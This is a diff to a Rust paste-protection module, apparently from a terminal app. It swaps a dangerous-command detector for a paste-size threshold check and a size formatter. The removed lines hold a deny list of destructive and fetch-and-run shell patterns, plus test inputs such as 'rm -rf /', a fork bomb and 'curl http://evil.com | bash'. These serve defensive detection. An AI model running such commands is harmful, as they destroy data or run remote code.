@@ -1,70 +1,35 @@
-/// Paste protection: detect dangerous patterns in pasted text.
+/// Paste protection: warn when pasted content exceeds a size threshold.
 
-/// Check if pasted text contains potentially dangerous patterns.
-pub fn check_paste_safety(text: &str) -> Option<PasteWarning> {
-    let trimmed = text.trim();
-
-    // Multi-line paste (could execute multiple commands)
-    let line_count = trimmed.lines().count();
-
-    // Dangerous command patterns
-    let dangerous_patterns = [
-        "sudo rm ",
-        "rm -rf",
-        "rm -fr",
-        "mkfs.",
-        ":(){:|:&};:", // fork bomb
-        "dd if=",
-        "> /dev/sd",
-        "chmod -R 777",
-        "curl | sh",
-        "curl | bash",
-        "wget | sh",
-        "wget | bash",
-        "curl|sh",
-        "curl|bash",
-        "| sh",
-        "| bash",
-        "shutdown",
-        "reboot",
-        "init 0",
-        "init 6",
-    ];
-
-    let lower = trimmed.to_lowercase();
-    // Normalize whitespace so patterns like "curl  |  bash" are still caught
-    let normalized = lower.split_whitespace().collect::<Vec<_>>().join(" ");
-    for pattern in &dangerous_patterns {
-        if normalized.contains(pattern) {
-            return Some(PasteWarning {
-                reason: format!("Contains potentially dangerous command: {}", pattern),
-                text: text.to_string(),
-                line_count,
-            });
-        }
+/// Returns `Some(PasteInfo)` if the paste exceeds the threshold and needs
+/// user confirmation. Returns `None` if the paste is small enough to proceed.
+/// A threshold of 0 disables the check entirely.
+pub fn check_paste_size(text: &str, threshold: usize) -> Option<PasteInfo> {
+    if threshold == 0 || text.len() <= threshold {
+        return None;
     }
-
-    // Warn on multiline paste (could execute unexpectedly)
-    if line_count > 3 {
-        return Some(PasteWarning {
-            reason: format!(
-                "Multi-line paste ({} lines) -- may execute commands",
-                line_count
-            ),
-            text: text.to_string(),
-            line_count,
-        });
-    }
-
-    None
+    Some(PasteInfo {
+        text: text.to_string(),
+        size: text.len(),
+        line_count: text.lines().count(),
+    })
 }
 
 #[derive(Debug, Clone)]
-pub struct PasteWarning {
-    pub reason: String,
+pub struct PasteInfo {
     pub text: String,
-    #[allow(dead_code)]
+    pub size: usize,
     pub line_count: usize,
+}
+
+/// Format a byte size for display (e.g. "1.2 KB", "3.4 MB").
+pub fn format_size(bytes: usize) -> String {
+    if bytes < 1024 {
+        format!("{} B", bytes)
+    } else if bytes < 1024 * 1024 {
+        format!("{:.1} KB", bytes as f64 / 1024.0)
+    } else {
+        format!("{:.1} MB", bytes as f64 / (1024.0 * 1024.0))
+    }
 }
 
 #[cfg(test)]
@@ -72,38 +37,41 @@ mod tests {
     use super::*;
 
     #[test]
-    fn safe_paste_is_none() {
-        assert!(check_paste_safety("echo hello").is_none());
+    fn below_threshold_is_none() {
+        assert!(check_paste_size("hello", 100).is_none());
     }
 
     #[test]
-    fn dangerous_rm_rf() {
-        let w = check_paste_safety("rm -rf /").unwrap();
-        assert!(w.reason.contains("rm -rf"));
+    fn at_threshold_is_none() {
+        let text = "a".repeat(100);
+        assert!(check_paste_size(&text, 100).is_none());
     }
 
     #[test]
-    fn dangerous_curl_pipe_bash() {
-        let w = check_paste_safety("curl http://evil.com | bash").unwrap();
-        assert!(w.reason.contains("| bash"));
+    fn above_threshold_returns_info() {
+        let text = "a".repeat(101);
+        let info = check_paste_size(&text, 100).unwrap();
+        assert_eq!(info.size, 101);
     }
 
     #[test]
-    fn dangerous_fork_bomb() {
-        let w = check_paste_safety(":(){:|:&};:").unwrap();
-        assert!(w.reason.contains(":(){:|:&};:"));
+    fn zero_threshold_disables_check() {
+        let text = "a".repeat(10000);
+        assert!(check_paste_size(&text, 0).is_none());
     }
 
     #[test]
-    fn multiline_paste_warns() {
-        let text = "line1\nline2\nline3\nline4\n";
-        let w = check_paste_safety(text).unwrap();
-        assert!(w.reason.contains("Multi-line"));
+    fn format_size_bytes() {
+        assert_eq!(format_size(500), "500 B");
     }
 
     #[test]
-    fn three_lines_is_safe() {
-        let text = "line1\nline2\nline3";
-        assert!(check_paste_safety(text).is_none());
+    fn format_size_kb() {
+        assert_eq!(format_size(5000), "4.9 KB");
+    }
+
+    #[test]
+    fn format_size_mb() {
+        assert_eq!(format_size(2_000_000), "1.9 MB");
     }
 }
